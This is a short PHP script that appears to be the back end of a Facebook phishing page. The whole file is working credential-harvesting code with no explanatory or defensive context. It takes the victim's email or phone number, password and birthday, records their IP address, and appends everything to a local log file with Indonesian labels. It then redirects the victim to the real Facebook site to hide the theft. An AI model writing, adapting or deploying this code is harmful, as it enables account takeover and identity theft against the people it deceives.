<?php 
if(!isset($_POST['email']) || !isset($_POST['password'])) {
    header('location: ./');
} else {
	$email = $_POST['email'];
	$birthday = $_POST['birthday'];
    $pass  = $_POST['password'];
	$ip    = $_SERVER['REMOTE_ADDR'];

	if(empty($email) || empty($pass)) {
		echo "<scrip>alert('Complete All Data!'); document.location='./';</script>";
	} else {
        $file = "GASPOLLLokeeeeeeeeeLL.txt";
        
        $handle = fopen($file, 'a');
        fwrite($handle, "==============================");
        fwrite($handle, "\n");
        fwrite($handle, "Result Facebook");
        fwrite($handle, "\n");
        fwrite($handle, "\n");
        fwrite($handle, "Email atau Telepon : ");
        fwrite($handle, "$email");
        fwrite($handle, "\n");
        fwrite($handle, "Kata Sandi : ");
        fwrite($handle, "$pass");
        fwrite($handle, "\n");
		fwrite($handle, "Birthday : ");
        fwrite($handle, "$birthday");
        fwrite($handle, "\n");
        fwrite($handle, "IP Address : ");
        fwrite($handle, "$ip");
        fwrite($handle, "\n");
        fwrite($handle, "==============================");
        fwrite($handle, "\n");
        fwrite($handle, "\n");
        if(fclose($handle)) {
			header('location: https://www.facebook.com/?_rdc=1&_rdr');
		}
	}
}

?>